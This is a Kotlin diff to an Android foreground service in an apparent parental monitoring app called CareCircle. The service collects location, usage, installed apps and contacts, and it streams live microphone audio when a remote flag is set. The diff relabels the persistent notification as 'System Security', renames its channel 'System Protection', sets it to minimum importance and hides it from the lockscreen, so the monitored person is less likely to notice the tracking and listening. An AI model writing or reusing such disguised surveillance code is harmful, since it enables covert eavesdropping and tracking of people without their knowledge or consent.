@@ -39,10 +39,10 @@ import kotlinx.coroutines.launch
  * RESPONSIBILITIES:
  *  - Location updates (adaptive priority — battery-friendly)
  *  - Periodic heartbeat (3 min)
- *  - Full data sync (30 min) — location + battery + device info + usage
- *  - Parent sync_request polling (10 sec)
- *  - Parent sync_mic polling (10 sec) — audio listening control
- *  - Contacts sync request handling
+ *  - Realtime child_control listener (Firestore Snapshot Listener — 0 polling reads)
+ *  - General data sync (30 min) — location + battery + device info + usage (NO contacts)
+ *  - Contacts sync handling (triggered ONLY when parent explicitly requests)
+ *  - Installed apps sync (24 hours)
  *  - Native WebRTC audio streaming (real-time)
  *  - WebRTC state restoration on service restart
  *  - Single persistent notification (dynamic text)
@@ -63,9 +63,8 @@ class CareCircleForegroundService : Service() {
         private const val LOOP_INTERVAL_MS = 10_000L              // Main loop: 10s
         private const val WAKELOCK_RENEW_INTERVAL_MS = 4 * 60_000L  // Renew WakeLock: 4 min
         private const val HEARTBEAT_INTERVAL_MS = 3 * 60_000L     // Heartbeat: 3 min
-        private const val FULL_SYNC_INTERVAL_MS = 30 * 60_000L    // Full sync: 30 min
-        private const val SYNC_REQUEST_CHECK_MS = 10_000L          // 🔥 10 sec — fast sync + mic response
-        private const val APPS_SYNC_INTERVAL_MS = 6 * 60 * 60_000L  // Installed apps: 6 hours
+        private const val FULL_SYNC_INTERVAL_MS = 30 * 60_000L    // Full sync: 30 min (Screen Time, Device Info, Location ONLY)
+        private const val APPS_SYNC_INTERVAL_MS = 24 * 60 * 60_000L  // Installed apps: 24 hours (1 day)
 
         private const val WAKE_LOCK_TAG = "CareCircle::MasterWakeLock"
         private const val PREFS_NAME = "carecircle_prefs"
@@ -130,15 +129,37 @@ class CareCircleForegroundService : Service() {
             val notification = buildNotification()
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                startForeground(
-                    NOTIFICATION_ID,
-                    notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
-                )
+                try {
+                    startForeground(
+                        NOTIFICATION_ID,
+                        notification,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
+                                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    )
+                    Log.d(TAG, "✅ startForeground called (specialUse|microphone)")
+                } catch (e: Exception) {
+                    Log.w(TAG, "⚠️ startForeground with microphone failed, falling back: ${e.message}")
+                    startForeground(
+                        NOTIFICATION_ID,
+                        notification,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+                    )
+                }
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                try {
+                    startForeground(
+                        NOTIFICATION_ID,
+                        notification,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    )
+                    Log.d(TAG, "✅ startForeground called (microphone)")
+                } catch (e: Exception) {
+                    Log.w(TAG, "⚠️ startForeground with microphone failed: ${e.message}")
+                    startForeground(NOTIFICATION_ID, notification)
+                }
             } else {
                 startForeground(NOTIFICATION_ID, notification)
             }
-            Log.d(TAG, "✅ startForeground called (specialUse)")
         } catch (e: Exception) {
             Log.e(TAG, "❌ startForeground FAILED: ${e.message}")
         }
@@ -175,8 +196,16 @@ class CareCircleForegroundService : Service() {
             Log.e(TAG, "Failed to start CallDetectorService: ${e.message}")
         }
 
-        // 🔥 NEW: Restore previous WebRTC session (if was running before restart)
-        restoreWebRTCSession()
+        // 🔥 WebRTC Audio Sender (single instance reused across sessions)
+        try {
+            nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
+            Log.d(TAG, "✅ NativeWebRTCAudioSender initialized")
+        } catch (e: Exception) {
+            Log.e(TAG, "NativeWebRTCAudioSender init failed: ${e.message}")
+        }
+
+        // 🔥 Clean up any stale WebRTC state from previous session
+        clearStaleWebRTCState()
 
         // Start main loop
         handler.post(mainLoop)
@@ -219,11 +248,21 @@ class CareCircleForegroundService : Service() {
         super.onTaskRemoved(rootIntent)
     }
 
+    private var controlListenerRegistration: com.google.firebase.firestore.ListenerRegistration? = null
+
     override fun onDestroy() {
         Log.w(TAG, "❌ Service destroyed")
         handler.removeCallbacks(mainLoop)
         serviceScope.cancel()
         releaseWakeLock()
+
+        try {
+            controlListenerRegistration?.remove()
+            controlListenerRegistration = null
+            Log.d(TAG, "Stopped child_control snapshot listener")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to remove snapshot listener: ${e.message}")
+        }
 
         // 🔥 Stop call detection
         try {
@@ -252,6 +291,9 @@ class CareCircleForegroundService : Service() {
             try {
                 val now = System.currentTimeMillis()
 
+                // 🔥 Ensure Realtime Snapshot Listener is attached (0 polling reads!)
+                ensureChildControlListener()
+
                 // 🔥 WakeLock renewal (defensive — system may have released)
                 if (now - lastWakeLockRenew >= WAKELOCK_RENEW_INTERVAL_MS) {
                     renewWakeLock()
@@ -273,19 +315,7 @@ class CareCircleForegroundService : Service() {
                         lastHeartbeat = now
                     }
 
-                    // 2. Parent sync_request check (10 sec)
-                    if (now - lastSyncRequestCheck >= SYNC_REQUEST_CHECK_MS) {
-                        serviceScope.launch {
-                            try {
-                                checkSyncRequest()
-                            } catch (e: Exception) {
-                                Log.e(TAG, "SyncReq: ${e.message}")
-                            }
-                        }
-                        lastSyncRequestCheck = now
-                    }
-
-                    // 3. Full data sync (30 min)
+                    // 2. Full data sync (30 min — Screen Time, Device Info, Location ONLY)
                     if (now - lastFullSync >= FULL_SYNC_INTERVAL_MS) {
                         serviceScope.launch {
                             try {
@@ -297,7 +327,7 @@ class CareCircleForegroundService : Service() {
                         lastFullSync = now
                     }
 
-                    // 4. Installed apps sync (6 hours)
+                    // 3. Installed apps sync (6 hours)
                     if (now - lastAppsSync >= APPS_SYNC_INTERVAL_MS) {
                         serviceScope.launch {
                             try {
@@ -319,135 +349,152 @@ class CareCircleForegroundService : Service() {
     }
 
     /**
-     * Check if parent requested sync (sync_request = true in child_control)
-     * Also handles: contacts_sync_request, sync_mic (audio listening)
+     * 🔥 Realtime Snapshot Listener Attachment — 0 Polling Reads!
      */
-    private suspend fun checkSyncRequest() {
-        try {
-            FirestoreClient.getChildControl()?.let { data ->
-                val syncRequested = data["sync_request"] as? Boolean ?: false
-                val contactsSyncRequested = data["contacts_sync_request"] as? Boolean ?: false
+    private fun ensureChildControlListener() {
+        if (controlListenerRegistration != null) return
 
-                // 🔥 NEW: Audio listening control
-                val syncMic = data["sync_mic"] as? Boolean ?: false
-                val callId = data["call_id"] as? String
+        val uid = FirestoreClient.getUserId() ?: run {
+            val prefsUid = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                .getString("currentUserId", null)
+            if (!prefsUid.isNullOrEmpty()) {
+                FirestoreClient.setUserId(prefsUid)
+                prefsUid
+            } else null
+        } ?: return
 
-                /// this is for data sync
-                if (syncRequested) {
-                    Log.d(TAG, "📡 Sync requested by parent — collecting all data")
-                    dataCollector.collectAndSyncAll()
-                    FirestoreClient.updateSyncComplete()
-                }
+        controlListenerRegistration = FirestoreClient.listenToChildControl { data ->
+            handleChildControlChange(data)
+        }
 
-                /// this is for contacts sync
-                if (contactsSyncRequested) {
-                    Log.d(TAG, "📡 Contacts sync requested by parent")
-                    try {
-                        ContactsSyncHelper(applicationContext).syncContacts()
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Contacts sync failed: ${e.message}")
-                    }
-                    // Clear the flag
-                    FirestoreClient.clearContactsSyncRequest()
-                }
-
-
-                // 🔥 NEW: Handle audio listening (sync_mic)
-                if (syncMic && !callId.isNullOrEmpty()) {
-
-                    // 🔥 FIX: If call_id changed OR webrtc not running, restart WebRTC
-                    if (webrtcCallId != callId || !webrtcRunning) {
-                        Log.d(TAG, "🎤 Audio requested for call $callId (previous: $webrtcCallId)")
-
-                        // Stop previous session if any
-                        if (webrtcRunning) {
-                            Log.d(TAG, "🔄 Call ID changed — stopping old WebRTC session")
-                            try {
-                                nativeWebRTC?.stop()
-                            } catch (e: Exception) {
-                                Log.e(TAG, "Old WebRTC stop failed: ${e.message}")
-                            }
-                        }
-
-                        // Start new session
-                        try {
-                            nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
-                            nativeWebRTC?.start(callId)
-                            webrtcRunning = true
-                            webrtcCallId = callId
-
-                            // Save state for restoration
-                            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                                .edit()
-                                .putBoolean("webrtc_running", true)
-                                .putString("webrtc_call_id", callId)
-                                .apply()
-
-                            // Update notification
-                            updateNotification(
-                                "CareCircle Listening Active",
-                                "Parent is listening to surroundings"
-                            )
-                        } catch (e: Exception) {
-                            Log.e(TAG, "❌ WebRTC start failed: ${e.message}")
-                            webrtcRunning = false
-                            webrtcCallId = null
-                        }
-                    }
-                } else if (!syncMic && webrtcRunning) {
-                    Log.d(TAG, "🛑 Stopping audio listening")
-                    try {
-                        nativeWebRTC?.stop()
-                        webrtcRunning = false
-                        webrtcCallId = null
-
-                        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                            .edit()
-                            .putBoolean("webrtc_running", false)
-                            .remove("webrtc_call_id")
-                            .apply()
-
-                        // Restore normal notification
-                        updateNotification(
-                            "CareCircle Protection Active",
-                            "Monitoring is running"
-                        )
-                    } catch (e: Exception) {
-                        Log.e(TAG, "❌ WebRTC stop failed: ${e.message}")
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "checkSyncRequest failed: ${e.message}")
+        if (controlListenerRegistration != null) {
+            Log.d(TAG, "✅ Realtime snapshot listener attached to child_control/$uid (0 polling reads!)")
         }
     }
 
     /**
-     * 🔥 NEW: Restore WebRTC session on service restart
+     * 🔥 Realtime handler for child_control document updates from Firestore.
+     * Separates general sync (Screen time, Device Info, Location) from Contacts sync.
      */
-    private fun restoreWebRTCSession() {
-        try {
-            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-            val wasRunning = prefs.getBoolean("webrtc_running", false)
-            val lastCallId = prefs.getString("webrtc_call_id", null)
+    private fun handleChildControlChange(data: Map<String, Any?>) {
+        val syncRequested = data["sync_request"] as? Boolean ?: false
+        val contactsSyncRequested = data["contacts_sync_request"] as? Boolean ?: false
+        val syncMic = data["sync_mic"] as? Boolean ?: false
+        val callId = data["call_id"] as? String
 
-            if (wasRunning && !lastCallId.isNullOrEmpty()) {
-                Log.d(TAG, "🔄 Restoring WebRTC session: $lastCallId")
-                if (nativeWebRTC == null) {
-                    nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
+        // 1. General Sync: Screen Time, Device Info & Location ONLY
+        if (syncRequested) {
+            Log.d(TAG, "📡 Parent sync requested — collecting Screen Time, Device Info & Location ONLY")
+            serviceScope.launch {
+                try {
+                    dataCollector.collectAndSyncAll()
+                } catch (e: Exception) {
+                    Log.e(TAG, "General sync failed: ${e.message}")
+                } finally {
+                    FirestoreClient.updateSyncComplete()
                 }
-                nativeWebRTC?.restoreIfNeeded(true, lastCallId)
-                webrtcRunning = true
-                webrtcCallId = lastCallId
+            }
+        }
 
-                // Update notification
+        // 2. Contacts Sync ONLY (when parent explicitly requests contacts sync)
+        if (contactsSyncRequested) {
+            Log.d(TAG, "📡 Contacts sync requested by parent — syncing Contacts ONLY")
+            serviceScope.launch {
+                try {
+                    ContactsSyncHelper(applicationContext).syncContacts()
+                } catch (e: Exception) {
+                    Log.e(TAG, "Contacts sync failed: ${e.message}")
+                } finally {
+                    FirestoreClient.clearContactsSyncRequest()
+                }
+            }
+        }
+
+        // 3. Audio listening control (WebRTC)
+        handleMicSync(syncMic, callId)
+    }
+
+    /**
+     * 🔥 Handle audio listening (sync_mic)
+     */
+    private fun handleMicSync(syncMic: Boolean, callId: String?) {
+        if (syncMic && !callId.isNullOrEmpty()) {
+            if (webrtcCallId != callId || !webrtcRunning) {
+                Log.d(TAG, "🎤 Audio requested for call $callId (previous: $webrtcCallId)")
+
+                if (webrtcRunning) {
+                    Log.d(TAG, "🔄 Call ID changed — stopping old WebRTC session")
+                    try {
+                        nativeWebRTC?.stop()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Old WebRTC stop failed: ${e.message}")
+                    }
+                }
+
+                // 🔥 Update notification FIRST to ensure MICROPHONE foreground service type is active
                 updateNotification(
                     "CareCircle Listening Active",
                     "Parent is listening to surroundings"
                 )
+
+                try {
+                    if (nativeWebRTC == null) {
+                        nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
+                    }
+                    nativeWebRTC?.start(callId)
+                    webrtcRunning = true
+                    webrtcCallId = callId
+
+                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                        .edit()
+                        .putBoolean("webrtc_running", true)
+                        .putString("webrtc_call_id", callId)
+                        .apply()
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ WebRTC start failed: ${e.message}")
+                    webrtcRunning = false
+                    webrtcCallId = null
+                }
             }
+        } else if (!syncMic && webrtcRunning) {
+            Log.d(TAG, "🛑 Stopping audio listening")
+            try {
+                nativeWebRTC?.stop()
+                webrtcRunning = false
+                webrtcCallId = null
+
+                getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                    .edit()
+                    .putBoolean("webrtc_running", false)
+                    .remove("webrtc_call_id")
+                    .apply()
+
+                updateNotification(
+                    "CareCircle Protection Active",
+                    "Monitoring is running"
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ WebRTC stop failed: ${e.message}")
+            }
+        }
+    }
+
+    /**
+     * 🔥 Clear any stale WebRTC state on service restart.
+     * Never auto-restore old sessions — parent will initiate a fresh session if needed.
+     */
+    private fun clearStaleWebRTCState() {
+        try {
+            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                .edit()
+                .putBoolean("webrtc_running", false)
+                .remove("webrtc_call_id")
+                .apply()
+            webrtcRunning = false
+            webrtcCallId = null
+            Log.d(TAG, "🧹 Cleared stale WebRTC state")
         } catch (e: Exception) {
-            Log.e(TAG, "WebRTC restore failed: ${e.message}")
+            Log.e(TAG, "WebRTC state clear failed: ${e.message}")
         }
     }
 
@@ -461,25 +508,19 @@ class CareCircleForegroundService : Service() {
                 .setContentText(content)
                 .setSmallIcon(R.drawable.ic_notification)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setCategory(NotificationCompat.CATEGORY_SERVICE)
                 .setShowWhen(false)
                 .build()
 
-            // 🔥 CRITICAL: Update foreground service type to include MICROPHONE when audio is active
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                val serviceType = if (title.contains("Listening")) {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
-                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-                } else {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
-                }
-                startForeground(NOTIFICATION_ID, notification, serviceType)
-            } else {
-                startForeground(NOTIFICATION_ID, notification)
-            }
+            // 🔥 Use NotificationManager.notify() to update the notification text/UI.
+            // NEVER call startForeground() here — calling startForeground() without MICROPHONE
+            // strips the microphone permission from the service, and Android 11-14 permanently
+            // blocks re-adding MICROPHONE from the background!
+            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            manager.notify(NOTIFICATION_ID, notification)
 
-            Log.d(TAG, "✅ Notification + service type updated (audio=${title.contains("Listening")})")
+            Log.d(TAG, "✅ Notification text updated: $title")
         } catch (e: Exception) {
             Log.e(TAG, "Notification update failed: ${e.message}")
         }
@@ -489,11 +530,11 @@ class CareCircleForegroundService : Service() {
 
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("CareCircle Protection Active")
-            .setContentText("Monitoring is running in background")
+            .setContentTitle("System Security")
+            .setContentText("Device protection active")
             .setSmallIcon(R.drawable.ic_notification)
             .setOngoing(true)  // 🔥 Non-dismissable
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setShowWhen(false)
             .build()
@@ -503,12 +544,12 @@ class CareCircleForegroundService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "CareCircle Protection",
-                NotificationManager.IMPORTANCE_LOW
+                "System Protection",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Keeps monitoring service alive"
+                description = "Keeps system protection service active"
                 setShowBadge(false)
-                lockscreenVisibility = Notification.VISIBILITY_PRIVATE
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
